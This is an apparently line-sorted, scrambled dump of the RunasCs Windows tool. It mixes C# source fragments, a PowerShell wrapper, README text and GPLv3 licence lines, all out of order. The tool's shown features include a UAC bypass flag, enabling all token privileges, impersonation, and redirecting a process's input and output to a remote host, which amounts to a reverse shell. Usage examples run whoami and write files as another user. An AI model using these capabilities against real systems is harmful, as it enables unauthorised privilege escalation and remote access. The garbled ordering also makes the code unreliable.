    private enum SECURITY_IMPERSONATION_LEVEL 
    private enum SECURITY_INFORMATION : uint
    private enum SE_OBJECT_TYPE
    private enum SID_NAME_USE
    private enum TOKEN_INFORMATION_CLASS
    private enum TokenGroupAttributes : uint
    private static bool HelpRequired(string param)
    private static extern Int32 WSAGetLastError()
    private static extern IntPtr FreeSid(IntPtr pSid)
    private static extern IntPtr GetProcessWindowStation()
    private static extern IntPtr GetSidSubAuthorityCount(IntPtr sid)
    private static extern bool CloseDesktop(IntPtr hDesktop)
    private static extern bool CloseHandle(IntPtr handle)
    private static extern bool CloseWindowStation(IntPtr hWinsta)
    private static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment)
    private static extern bool ImpersonateLoggedOnUser(IntPtr hToken)
    private static extern bool RevertToSelf()
    private static extern bool SetProcessWindowStation(IntPtr hWinSta)
    private static extern int GetLengthSid(IntPtr pSID)
    private static extern int ResumeThread(IntPtr hThread)
    private static extern int closesocket(IntPtr s)
    private static extern ushort htons(ushort hostshort)
    private static int DefaultCreateProcessFunction()
    private static int ValidateCreateProcessFunction(string function)
    private static int ValidateLogonType(string type)
    private static string GetWin32ErrorString()
    private static string convertAttributeToString(UInt32 attribute){
    private static string[] ValidateRemote(string remote)
    private static uint ValidateProcessTimeout(string timeout)
    private string GetProcessFunction(int createProcessFunction){
    private string ParseCommonProcessesInCommandline(string commandline) {
    private string ReadOutputFromPipe(IntPtr hReadPipe)
    private struct ACCESS_ALLOWED_ACE
    private struct ACE_HEADER
    private struct ACL_SIZE_INFORMATION
    private struct PROFILEINFO
    private struct ProcessInformation
    private struct SECURITY_ATTRIBUTES
    private struct SID_AND_ATTRIBUTES
    private struct SID_IDENTIFIER_AUTHORITY
    private struct SOCKADDR_IN
    private struct STARTUPINFO
    private struct SidIdentifierAuthority
    private struct TOKEN_MANDATORY_LABEL
    private struct TOKEN_PRIVILEGES_2
    private struct WSAData
    private void AddAceToDesktop(){
    private void AddAceToWindowStation(){
    private void RevertToSelfCustom() {
    public RunasCs()
    public RunasCsException(){}
    public RunasCsException(string message) : base(error_string 
    public WindowStationDACL()
    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000
    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000
    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080
    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040
    public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020
    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100
    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED 
    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001
    public const UInt32 TOKEN_DUPLICATE = 0x0002
    public const UInt32 TOKEN_IMPERSONATE = 0x0004
    public const UInt32 TOKEN_QUERY = 0x0008
    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010
    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ 
    public enum IntegrityLevel : int
    public static IntegrityLevel GetTokenIntegrityLevel(IntPtr hToken)
    public static List<string[]> GetTokenPrivileges(IntPtr tHandle){
    public static bool IsFilteredUACToken(IntPtr hToken) {
    public static string EnableAllPrivileges(IntPtr token)
    public static string RunasCsMain(string[] args)
    public struct LUID
    public struct LUID_AND_ATTRIBUTES
    public struct TOKEN_ELEVATION
    public struct TOKEN_ELEVATION_TYPE
    public struct TOKEN_PRIVILEGES
    public void CleanupHandles()
    reasonable ways as different from the original version
    regardless of how they are packaged.  This License gives no
    released under this License and any conditions added under section
    requiring that modified versions of such material be marked in
    static void Main(string[] args)
    terms of sections 15 and 16 of this License
    those licensors and authors.
    to remote hosts) and you can specify the password directly on the command line.
    under certain conditions
    username                username of the user
    with subsection 6b.
    work need not make them do so.
    written offer to provide the Corresponding Source.  This
    you inform other peers where the object code and Corresponding
    {
    }
  // flushing console before waiting for child process execution
  0. Definitions.
  1. Source Code.
  10. Automatic Licensing of Downstream Recipients.
  11. Patents.
  12. No Surrender of Others' Freedom.
  13. Use with the GNU Affero General Public License.
  14. Revised Versions of this License.
  15. Disclaimer of Warranty.
  16. Limitation of Liability.
  17. Interpretation of Sections 15 and 16.
  2. Basic Permissions.
  3. Protecting Users' Legal Rights From Anti-Circumvention Law.
  4. Conveying Verbatim Copies.
  5. Conveying Modified Source Versions.
  6. Conveying Non-Source Forms.
  7. Additional Terms.
  8. Termination.
  9. Acceptance Not Required for Having Copies.
  A compilation of a covered work with other separate and independent
  All rights granted under this License are granted for the term of
  Conveying under any other circumstances is permitted solely under
  Developers that use the GNU GPL protect your rights with two steps:
  Each version is given a distinguishing version number.  If the
  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
  If the Program specifies that a proxy can decide which future
  If the disclaimer of warranty and limitation of liability provided
  Later license versions may give you additional or different
  No covered work shall be deemed part of an effective technological
  Nothing in this License shall be construed as excluding or limiting
  Some devices are designed to deny users access to install or run
  Termination of your rights under this section does not terminate the
  The Corresponding Source for a work in source code form is that
  The Corresponding Source need not include anything that users
  The Free Software Foundation may publish revised and/or new versions of
  The GNU General Public License does not permit incorporating your program
  The licenses for most software and other practical works are designed
  The requirement to provide Installation Information does not include a
  You are not required to accept this License in order to receive or
  You may convey a covered work in object code form under the terms
  You may convey verbatim copies of the Program's source code as you
  You may not impose any further restrictions on the exercise of the
  You may not propagate or modify a covered work except as expressly
 !forceUserProfileCreation 
 !userProfileExists)
 (2) logon type is restricted by 
 (both for 
 (cbNewAce
 (forceProfileCreation 
 (uint)GetLengthSid(this.userSid) - (uint)Marshal.SizeOf(typeof(uint))
 // call once to get the name len
 ACCESS_MASK.DESKTOP_READOBJECTS)
 ACCESS_MASK.DESKTOP_WRITEOBJECTS 
 ACCESS_MASK.WRITE_DAC 
 ACCESS_MASK.WRITE_DAC)
 AccessToken.GetTokenIntegrityLevel(currentTokenHandle) >= AccessToken.IntegrityLevel.High)
 AccessToken.GetTokenIntegrityLevel(currentTokenHandle) >= AccessToken.IntegrityLevel.Medium)
 Allows explicit credentials
 Allows redirecting 
 Allows to bypass UAC when an administrator password is known (flag --bypass-uac)
 Allows to create a process with the main thread impersonating the requested user (flag --remote-impersonation)
 CREATE_SUSPENDED 
 Credits
 DELETE                   
 DESKTOP_CREATEMENU 
 DESKTOP_CREATEWINDOW 
 DESKTOP_JOURNALPLAYBACK 
 DESKTOP_JOURNALRECORD 
 DESKTOP_SWITCHDESKTOP 
 DESKTOP_WRITEOBJECTS 
 Everyone is permitted to copy and distribute verbatim copies
 GENERIC_EXECUTE 
 GENERIC_WRITE 
 GetProcessFunction(createProcessFunction) 
 GetWin32ErrorString()) {}
 HelpRequired(args[0]))
 INHERIT_ONLY_ACE 
 It's Open Source :)
 Manage properly 
 Marshal.GetLastWin32Error() == 1314)
 Out-File RunasCs.base64
 Out-Null
 ReadOutputFromPipe(this.hOutputRead)
 References
 Requirements
 RunasCs
 TOKEN_ADJUST_DEFAULT 
 TOKEN_ADJUST_GROUPS 
 TOKEN_ASSIGN_PRIMARY 
 TOKEN_IMPERSONATE 
 TOKEN_QUERY 
 TOKEN_QUERY)
 TOKEN_QUERY_SOURCE 
 Usage
 Uses more reliable create process functions like 
 WINSTA_ACCESSGLOBALATOMS 
 WINSTA_ENUMDESKTOPS      
 WINSTA_EXITWINDOWS       
 WINSTA_READSCREEN        
 WRITE_DAC                
 Works both if spawned from interactive process and from service process
 [@decoder](https://github.com/decoder-it)
 [@qtc-de](https://github.com/qtc-de)
 [@winlogon0](https://twitter.com/winlogon0)
 [Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
 [Getting an Interactive Service Account Shell](https://www.tiraniddo.dev/2020/02/getting-interactive-service-account.html)
 [Interactive Services](https://learn.microsoft.com/en-us/windows/win32/services/interactive-services)
 [Potatoes and tokens](https://decoder.cloud/2018/01/13/potato-and-tokens/)
 [Reading Your Way Around UAC (Part 1)](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html)
 [Reading Your Way Around UAC (Part 2)](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-2.html)
 [Reading Your Way Around UAC (Part 3)](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-3.html)
 [Starting an Interactive Client Process in C
 [Vanara - A set of .NET libraries for Windows implementing PInvoke calls to many native Windows APIs with supporting wrappers](https://github.com/dahall/Vanara)
 and 
 and each file should have at least
 and give all
 and the generated token from these authentications are filtered.
 cbNewAce
 commandLine 
 createProcessFunction > 2 ) {
 ctr
 ctr < args.Length
 desktopName 
 dwIndex
 dwIndex < aclSizeInfo.AceCount
 dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
 err == ERROR_INVALID_FLAGS)
 for 
 for an attempt in bypassing the token filtering limitation.
 for details type 
 for the creation of the new process
 forceUserProfileCreation)
 fqan 
 function
 function 
 has an automatic detection to determine the best create process function for every contexts.
 if the calling process holds the required privileges (automatic detection)
 integrity.ToString())
 is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials.
 it applies also to
 limitations)
 logon type is the one with the widest permissions as it doesn't get filtered by UAC in local tokens and still allows
 logonType == LOGON32_LOGON_BATCH 
 logonType == LOGON32_LOGON_NETWORK_CLEARTEXT)
 logonType == LOGON32_LOGON_SERVICE 
 logonType.ToString() 
 message) { }
 offset)
 privilege 
 processInfo.processId 
 remote 
 remote[1])
 section 10
 sessionId.ToString() 
 that solves some limitations:
 timeout)
 to 
 to a remote host
 type 
 userProfileExists) {
 userTokenIL < AccessToken.GetTokenIntegrityLevel(hTokenBatch))
 userTokenIL < AccessToken.GetTokenIntegrityLevel(hTokenNetwork))
 userTokenIL < AccessToken.GetTokenIntegrityLevel(hTokenService))
 username
 username 
 win32FunctionName 
 without even the implied warranty of
 won't wait for the end of the newly spawned process execution.
"                            Default: """""
"                            Default: """""""""
"                            Default: """"120000"""""
"                            Default: """"2"""" - Interactive"
"                            Default: ""120000"""
"                            Default: ""2"" - Interactive"
"                            WARNING: If non-existent, it creates the user profile"
"                            domain of the user, if in a domain. "
"                            domain of the user, if in a domain."
"                            redirect stdin, stdout and stderr to a remote host."
"                       Version 3, 29 June 2007"
"                    RunasCreateProcessAsUserW(username, domainName, password, logonType, logonProvider, commandLine, forceUserProfileCreation, userProfileExists, ref startupInfo, ref processInfo, ref logonTypeNotFiltered)"
"                    RunasCreateProcessWithTokenW(username, domainName, password, commandLine, logonType, logonFlags, logonProvider, ref startupInfo, ref processInfo, ref logonTypeNotFiltered)"
"                    STANDARD_RIGHTS_REQUIRED),"
"                    case ""--bypass-uac"":"
"                    case ""--domain"":"
"                    case ""--force-profile"":"
"                    case ""--function"":"
"                    case ""--logon-type"":"
"                    case ""--remote"":"
"                    case ""--remote-impersonation"":"
"                    case ""--timeout"":"
"                    case ""-b"":"
"                    case ""-d"":"
"                    case ""-f"":"
"                    case ""-i"":"
"                    case ""-l"":"
"                    case ""-p"":"
"                    case ""-r"":"
"                    case ""-t"":"
"                    if (LogonUser(username, domainName, password, logonTypeTry, logonProvider, ref hTokenCheck2)) {"
"                    throw new RunasCsException(""AddAce"", true)"
"                    throw new RunasCsException(""GetAce"", true)"
"                    throw new RunasCsException(""LogonUser"", true)"
"                    throw new RunasCsException(String.Format(""Selected logon type '{0}' is not granted to the user '{1}'. Use available logon type '{2}'."", logonType, username, availableLogonType.ToString()))"
"                    throw new RunasCsException(String.Format(""The flag --bypass-uac is not compatible with {0} but only with --function '2' (CreateProcessWithLogonW)"", GetProcessFunction(createProcessFunction)))"
"                // Console.Out.WriteLine(""["
"                // we check Service logon because by default it has the SeImpersonate privilege, available only in High IL"
"                ACE_HEADER pTempAceStruct = (ACE_HEADER)Marshal.PtrToStructure(pTempAce, typeof(ACE_HEADER))"
"                Console.Out.WriteLine(""["
"                Console.Out.WriteLine(String.Format(""["
"                RunasCreateProcessWithLogonW(username, domainName, password, logonType, logonFlags, commandLine, bypassUac, ref startupInfo, ref processInfo, ref logonTypeNotFiltered)"
"                domainName = ""."""
"                if (!AddAce(pNewDacl, ACL_REVISION, MAXDWORD, pTempAce, (uint)pTempAceStruct.AceSize))"
"                if (!GetAce(pDacl, dwIndex, out pTempAce))"
"                if (!LookupAccountName(null,fqan,Sid,ref cbSid,referencedDomainName,ref cchReferencedDomainName,out sidUse))"
"                int[] logonTypeTryOrder = new int[] { LOGON32_LOGON_SERVICE, LOGON32_LOGON_BATCH, LOGON32_LOGON_NETWORK_CLEARTEXT, LOGON32_LOGON_NETWORK, LOGON32_LOGON_INTERACTIVE}"
"                throw new RunasCsException(""CreatePipe"", true)"
"                throw new RunasCsException(""CreateProcessWithLogonW logon type 2"", true)"
"                throw new RunasCsException(""CreateProcessWithLogonW logon type 9"", true)"
"                throw new RunasCsException(""CreateProcessWithLogonWUacBypass"", true)"
"                throw new RunasCsException(""DuplicateHandle stderr write pipe"", true)"
"                throw new RunasCsException(""DuplicateHandle stdout read pipe"", true)"
"                throw new RunasCsException(""GetAclInformation"", true)"
"                throw new RunasCsException(""GetTokenInformation TokenElevationType"", true)"
"                throw new RunasCsException(""GetUserObjectSecurity 1 size"", true)"
"                throw new RunasCsException(""LogonUser"", true)"
"                throw new RunasCsException(""LookupPrivilegeName"", true)"
"                throw new RunasCsException(""OpenDesktop"", true)"
"                throw new RunasCsException(""OpenWindowStation"", true)"
"                throw new RunasCsException(""SetNamedPipeHandleState"", true)"
"                throw new RunasCsException(""SetProcessWindowStation hWinsta"", true)"
"                throw new RunasCsException(""SetProcessWindowStation hWinstaSave"", true)"
"                throw new System.ArgumentException("""")"
"            // Check differences between the requested logon type and non-filtered logon types (Network, Batch, Service)"
"            // If IL mismatch, the user has potentially more privileges than the requested logon"
"            // the below logon types are not filtered by UAC, we allow login with them. Otherwise stick with NetworkCleartext"
"            // we check if the user has been granted the logon type requested, if not we show a message suggesting which logon type can be used to succesfully logon"
"            AccessToken.SetTokenIntegrityLevel(hTokenDupImpersonation, AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token))"
"            AccessToken.SetTokenIntegrityLevel(hTokenDuplicateLocal, AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token))"
"            CheckAvailableUserLogonType(username, password, domainName, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT)"
"            Console.Out.WriteLine(String.Format(""["
"            CreateEnvironmentBlock(out lpEnvironment, hToken, false)"
"            Default: """""
"            Default: ""120000"""
"            Default: ""2"" - Interactive"
"            GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevationType, IntPtr.Zero, tokenInfLength, out tokenInfLength)"
"            GetUserProfileDirectory(hToken, null, ref dwSize)"
"            LookupPrivilegeName(null, ptrLuid, null, ref luidNameLen)"
"            Marshal.Copy(Sid, 0, userSid, (int)cbSid)"
"            Marshal.StructureToPtr(luid, ptrLuid, true)"
"            PS>Invoke-RunasCs -Domain domain1 -Username user1 -Password password1 -Command ""cmd /c whoami /all"" -LogonType 8"
"            PS>Invoke-RunasCs -Username adm1 -Password password1 ""cmd /c echo admin > C:"
"            PS>Invoke-RunasCs -Username adm1 -Password password1 ""cmd /c whoami /priv"" -BypassUac"
"            PS>Invoke-RunasCs -Username user1 -Password password1 -Command ""cmd /c whoami /all"" -LogonType 9"
"            PS>Invoke-RunasCs -Username user1 -Password password1 -ProcessTimeout 0 -Command ""C:"
"            PS>Invoke-RunasCs user1 password1 ""cmd /c whoami /all"""
"            Redirect stdin, stdout and stderr of the specified command to a remote host"
"            Result = LookupPrivilegeName(null, ptrLuid, sb, ref luidNameLen)"
"            RunasRemoteImpersonation(username, domainName, password, logonType, logonProvider, commandLine, ref startupInfo, ref processInfo, ref logonTypeNotFiltered)"
"            Stdin, stdout and stderr will be redirected"
"            TOKEN_ELEVATION_TYPE tokenElevationType = (TOKEN_ELEVATION_TYPE)Marshal.PtrToStructure(tokenElevationTypePtr, typeof(TOKEN_ELEVATION_TYPE))"
"            The  domain of the user, if in a domain."
"            WARNING: If non-existent, it creates the user profile"
"            WaitForSingleObject(processInfo.process, processTimeout)"
"            args[0] = Environment.GetEnvironmentVariable(""COMSPEC"")"
"            args[0] = Environment.GetEnvironmentVariable(""WINDIR"") "
"            commandlineRet = string.Join("" "", args)"
"            foreach(KeyValuePair<int,string> item in createProcessFunctions) {"
"            foreach(KeyValuePair<int,string> item in logonTypes) {"
"            if (!CreateAnonymousPipeEveryoneAccess(ref hOutputReadTmpLocal, ref hOutputWriteLocal))"
"            if (!CreateProcessWithLogonW(username, domainName, password, LOGON_NETCREDENTIALS_ONLY, null, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo))"
"            if (!CreateProcessWithLogonW(username, domainName, password, logonFlags, null, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo))"
"            if (!CreateProcessWithLogonWUacBypass(logonTypeBypassUac, logonFlags, username, domainName, password, null, commandLine, ref startupInfo, out processInfo))"
"            if (!DuplicateHandle(hCurrentProcess, hOutputReadTmpLocal, hCurrentProcess, out hOutputReadLocal, 0, false, DUPLICATE_SAME_ACCESS))"
"            if (!DuplicateHandle(hCurrentProcess, hOutputWriteLocal, hCurrentProcess, out hErrorWriteLocal, 0, true, DUPLICATE_SAME_ACCESS))"
"            if (!GetAclInformation(pDacl, ref aclSizeInfo, (uint)Marshal.SizeOf(typeof(ACL_SIZE_INFORMATION)), ACL_INFORMATION_CLASS.AclSizeInformation))"
"            if (!GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevationType, tokenElevationTypePtr, tokenInfLength, out tokenInfLength))"
"            if (!LogonUser(username, domainName, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, ref hTokenUacCheck))"
"            if (!SetNamedPipeHandleState(hOutputReadLocal, ref PIPE_NOWAIT, IntPtr.Zero, IntPtr.Zero))"
"            if (IsLimitedUserLogon(hTokenUacCheck, username, domainName, password, out logonTypeNotFiltered))"
"            if (LogonUser(username, domainName, password, LOGON32_LOGON_NETWORK_CLEARTEXT, LOGON32_PROVIDER_DEFAULT, ref hTokenNetwork) "
"            if (domainName == """") // fixing bugs in seclogon ..."
"            if (domainName == """") // fixing bugs in seclogon when using LOGON32_LOGON_NEW_CREDENTIALS..."
"            if(privilege == ""SeAssignPrimaryTokenPrivilege"" "
"            if(privilege == ""SeImpersonatePrivilege"" "
"            int dwIntegrityLevel = Marshal.ReadInt32(GetSidSubAuthority(pSid, (Marshal.ReadByte(GetSidSubAuthorityCount(pSid)) - 1U)))"
"            output = String.Format(""{0}"", e.Message)"
"            output = invoker.RunAs(username, password, cmd, domain, processTimeout, logonType, createProcessFunction, remote, forceUserProfileCreation, bypassUac, remoteImpersonation)"
"            result = CreateProcessWithLogonW(username, domainName, password, logonFlags "
"            result = GetUserProfileDirectory(hToken, profileDir, ref dwSize)"
"            result = LoadUserProfile(hToken, ref profileInfo)"
"            return """""
"            return ""CreateProcessAsUserW()"""
"            return ""CreateProcessWithTokenW()"""
"            return ""Disabled"""
"            return ""Enabled Default"""
"            return ""Enabled"
"            return ""Enabled"""
"            return ""[-] Invalid arguments. Use --help for additional help."""
"            return ""[-] Not enough arguments. 3 Arguments required. Use --help for additional help."""
"            return String.Format(""{0}"", e.Message)"
"            string error = ""Invalid createProcess function: "" "
"            string error = ""Invalid logon_type value: "" "
"            string error = ""Invalid remote value: "" "
"            string error = ""The username "" "
"            this.hDesktop = OpenDesktop(""Default"", 0, false, ACCESS_MASK.READ_CONTROL "
"            this.hWinsta = OpenWindowStation(stationName, false, ACCESS_MASK.READ_CONTROL "
"            this.userSid = GetUserSid(domain, username)"
"            throw new RunasCsException(""AddAccessAllowedAce"", true)"
"            throw new RunasCsException(""AddAce"", true)"
"            throw new RunasCsException(""AdjustTokenPrivileges on privilege "" "
"            throw new RunasCsException(""CopySid"", true)"
"            throw new RunasCsException(""CreateProcess"", true)"
"            throw new RunasCsException(""CreateProcessAsUser"", true)"
"            throw new RunasCsException(""CreateProcessWithLogonWUacBypass: LogonUser"", true)"
"            throw new RunasCsException(""CreateProcessWithTokenW"", true)"
"            throw new RunasCsException(""DuplicateTokenEx"", true)"
"            throw new RunasCsException(""GetProcessWindowStation"", true)"
"            throw new RunasCsException(""GetSecurityDescriptorDacl"", true)"
"            throw new RunasCsException(""GetTokenInformation TokenElevation"", true)"
"            throw new RunasCsException(""GetTokenInformation"", true)"
"            throw new RunasCsException(""GetUserObjectInformation"", true)"
"            throw new RunasCsException(""GetUserObjectSecurity 2"", true)"
"            throw new RunasCsException(""InitializeAcl"", true)"
"            throw new RunasCsException(""InitializeSecurityDescriptor"", true)"
"            throw new RunasCsException(""Invalid process_timeout value: "" "
"            throw new RunasCsException(""LogonUser"", true)"
"            throw new RunasCsException(""OpenProcessToken"", true)"
"            throw new RunasCsException(""SetSecurityDescriptorDacl"", true)"
"            throw new RunasCsException(""SetThreadToken"", true)"
"            throw new RunasCsException(""SetUserObjectSecurity"", true)"
"            throw new RunasCsException(""Specified port is invalid: "" "
"            throw new RunasCsException(""[!] Failed to set the token's Integrity Level: "" "
"            throw new RunasCsException(String.Format(""WSAConnect failed with error code: {0}"", error))"
"            throw new RunasCsException(String.Format(""WSAStartup failed with error code: {0}"", error))"
"            userProfileExists = IsUserProfileCreated(username, password, domainName, logonType)"
"        $BypassUac,"
"        $Command,"
"        $CreateProcessFunction,"
"        $Domain = """","
"        $ForceProfile,"
"        $LogonType = ""2"","
"        $Password,"
"        $ProcessTimeout = ""120000"","
"        $Remote,"
"        $Username,"
"        $parametersRunasCs.add(""-b"")"
"        $parametersRunasCs.add(""-f"")"
"        $parametersRunasCs.add(""-i"")"
"        $parametersRunasCs.add(""-p"")"
"        $parametersRunasCs.add(""-r"")"
"        // GetTokenInformation(TokenElevation) does not return true in all cases, e.g. when having an High IL token with SeImpersonate privilege"
"        // If the original DACL is present, copy it to the new DACL."
"        // this will solve some issues, e.g. Access Denied errors when running whoami.exe"
"        // we check if the user has been granted the logon type requested, if not we show a message suggesting which logon type can be used to succesfully logon"
"        ACCESS_SYSTEM_SECURITY = 0x01000000,"
"        AccessToken.EnablePrivilege(""SeAssignPrimaryTokenPrivilege"", WindowsIdentity.GetCurrent().Token)"
"        AccessToken.EnablePrivilege(""SeImpersonatePrivilege"", WindowsIdentity.GetCurrent().Token)"
"        AccessToken.SetTokenIntegrityLevel(hToken, AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token))"
"        AccessToken.SetTokenIntegrityLevel(hTokenProcess, AccessToken.GetTokenIntegrityLevel(hTokenDupImpersonation))"
"        AclRevisionInformation = 1,"
"        AddAllowedAceToDACL(pNewDacl, ACCESS_MASK.GENERIC_ACCESS, CONTAINER_INHERIT_ACE "
"        AddAllowedAceToDACL(pNewDacl, ACCESS_MASK.WINSTA_ALL, NO_PROPAGATE_INHERIT_ACE, cbNewAce)"
"        CheckAvailableUserLogonType(username, password, domainName, logonType, logonProvider)"
"        CreateEnvironmentBlock(out lpEnvironment, hToken, false)"
"        DACL_SECURITY_INFORMATION         = 0x00000004,"
"        DELETE = 0x00010000,"
"        DESKTOP_CREATEMENU = 0x00000004,"
"        DESKTOP_CREATEWINDOW = 0x00000002,"
"        DESKTOP_ENUMERATE = 0x00000040,"
"        DESKTOP_HOOKCONTROL = 0x00000008,"
"        DESKTOP_JOURNALPLAYBACK = 0x00000020,"
"        DESKTOP_JOURNALRECORD = 0x00000010,"
"        DESKTOP_READOBJECTS = 0x00000001,"
"        DESKTOP_SWITCHDESKTOP = 0x00000100,"
"        DESKTOP_WRITEOBJECTS = 0x00000080,"
"        Dictionary<int,string> createProcessFunctions = getCreateProcessFunctionDict()"
"        Dictionary<int,string> createProcessFunctions = new Dictionary<int,string>()"
"        Dictionary<int,string> logonTypes = getLogonTypeDict()"
"        Dictionary<int,string> logonTypes = new Dictionary<int,string>()"
"        Disabled = 0,"
"        GENERIC_ALL = 0x10000000,"
"        GENERIC_EXECUTE = 0x20000000,"
"        GENERIC_READ = 0x80000000,"
"        GENERIC_WRITE = 0x40000000,"
"        GROUP_SECURITY_INFORMATION        = 0x00000002,"
"        GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, IntPtr.Zero, tokenInfLength, out tokenInfLength)"
"        GetUserEnvironmentBlock(hTokenDuplicate, username, forceUserProfileCreation, userProfileExists, out lpEnvironment)"
"        High = SECURITY_MANDATORY_HIGH_RID,"
"        ImpersonateLoggedOnUserWithProperIL(hToken, out hTokenDuplicate)"
"        IntPtr hToken = IntPtr.Zero, hTokenDuplicate = IntPtr.Zero"
"        LookupPrivilegeValue(null, privilege, ref sebLuid)"
"        Low = SECURITY_MANDATORY_LOW_RID,"
"        MAXIMUM_ALLOWED = 0x02000000,"
"        Marshal.StructureToPtr(authoritySid, pLabelAuthorityStruct, false)"
"        Marshal.StructureToPtr(pNewAceStruct, pNewAcePtr, false)"
"        Marshal.StructureToPtr(tokenLabel, pLabel, false)"
"        Medium = SECURITY_MANDATORY_MEDIUM_RID,"
"        OWNER_SECURITY_INFORMATION        = 0x00000001,"
"        PROTECTED_SACL_SECURITY_INFORMATION   = 0x40000000,"
"        READ_CONTROL = 0x00020000,"
"        Result = GetTokenInformation(tHandle, TOKEN_INFORMATION_CLASS.TokenPrivileges, IntPtr.Zero, TokenInfLength, out TokenInfLength)"
"        Result = GetTokenInformation(tHandle, TOKEN_INFORMATION_CLASS.TokenPrivileges, TokenInformation, TokenInfLength, out TokenInfLength) "
"        RunasCs.exe adm1 password1 """"cmd /c echo admin > C:"
"        RunasCs.exe adm1 password1 """"cmd /c whoami /priv"""" --bypass-uac"
"        RunasCs.exe adm1 password1 ""cmd /c echo admin > C:"
"        RunasCs.exe adm1 password1 ""cmd /c whoami /priv"" --bypass-uac"
"        RunasCs.exe user1 password1 """"C:"
"        RunasCs.exe user1 password1 """"cmd /c whoami /all"""" -d domain -l 8"
"        RunasCs.exe user1 password1 """"cmd /c whoami /all"""" -l 9"
"        RunasCs.exe user1 password1 """"cmd /c whoami /all"""""
"        RunasCs.exe user1 password1 ""C:"
"        RunasCs.exe user1 password1 ""cmd /c whoami /all"" -d domain -l 8"
"        RunasCs.exe user1 password1 ""cmd /c whoami /all"" -l 9"
"        RunasCs.exe user1 password1 ""cmd /c whoami /all"""
"        RunasSetupStdHandlesForProcess(processTimeout, remote, ref startupInfo, out this.hOutputWrite, out this.hErrorWrite, out this.hOutputRead, out socket)"
"        SACL_SECURITY_INFORMATION         = 0x00000008,"
"        SE_DS_OBJECT,"
"        SE_DS_OBJECT_ALL,"
"        SE_FILE_OBJECT,"
"        SE_GROUP_ENABLED = 0x4,"
"        SE_GROUP_ENABLED_BY_DEFAULT = 0x2,"
"        SE_GROUP_INTEGRITY = 0x20,"
"        SE_GROUP_INTEGRITY_ENABLED = 0x40,"
"        SE_GROUP_MANDATORY = 1,"
"        SE_GROUP_OWNER = 0x8,"
"        SE_GROUP_RESOURCE = 0x20000000,"
"        SE_GROUP_USE_FOR_DENY_ONLY = 0x10,"
"        SE_KERNEL_OBJECT,"
"        SE_LMSHARE,"
"        SE_PRINTER,"
"        SE_PROVIDER_DEFINED_OBJECT,"
"        SE_REGISTRY_KEY,"
"        SE_SERVICE,"
"        SE_UNKNOWN_OBJECT_TYPE = 0,"
"        SE_WINDOW_OBJECT,"
"        SE_WMIGUID_OBJECT,"
"        SPECIFIC_RIGHTS_ALL = 0x0000FFFF,"
"        STANDARD_RIGHTS_ALL = 0x001F0000,"
"        STANDARD_RIGHTS_EXECUTE = 0x00020000,"
"        STANDARD_RIGHTS_READ = 0x00020000,"
"        STANDARD_RIGHTS_REQUIRED = 0x000F0000,"
"        STANDARD_RIGHTS_WRITE = 0x00020000,"
"        SYNCHRONIZE = 0x00100000,"
"        Same = -2,"
"        SecurityAnonymous,"
"        SecurityIdentification,"
"        SecurityImpersonation,"
"        SetSecurityInfo((IntPtr)GetCurrentProcess, SE_OBJECT_TYPE.SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero)"
"        SetSecurityInfo(hTokenProcess, SE_OBJECT_TYPE.SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero)"
"        SetSecurityInfo(processInfo.process, SE_OBJECT_TYPE.SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero)"
"        SidTypeAlias,"
"        SidTypeDeletedAccount,"
"        SidTypeDomain,"
"        SidTypeGroup,"
"        SidTypeInvalid,"
"        SidTypeUnknown,"
"        SidTypeUser = 1,"
"        SidTypeWellKnownGroup,"
"        System = SECURITY_MANDATORY_SYSTEM_RID,"
"        TOKEN_ELEVATION tokenElevation = (TOKEN_ELEVATION)Marshal.PtrToStructure(tokenElevationPtr, typeof(TOKEN_ELEVATION))"
"        TOKEN_PRIVILEGES TokenPrivileges = (TOKEN_PRIVILEGES)Marshal.PtrToStructure( TokenInformation , typeof( TOKEN_PRIVILEGES ) ) "
"        TokenAccessInformation,"
"        TokenAppContainerNumber,"
"        TokenAppContainerSid,"
"        TokenAuditPolicy,"
"        TokenBnoIsolation,"
"        TokenCapabilities,"
"        TokenChildProcessFlags,"
"        TokenDefaultDacl,"
"        TokenDeviceClaimAttributes,"
"        TokenDeviceGroups,"
"        TokenElevation,"
"        TokenElevationType,"
"        TokenGroups,"
"        TokenGroupsAndPrivileges,"
"        TokenHasRestrictions,"
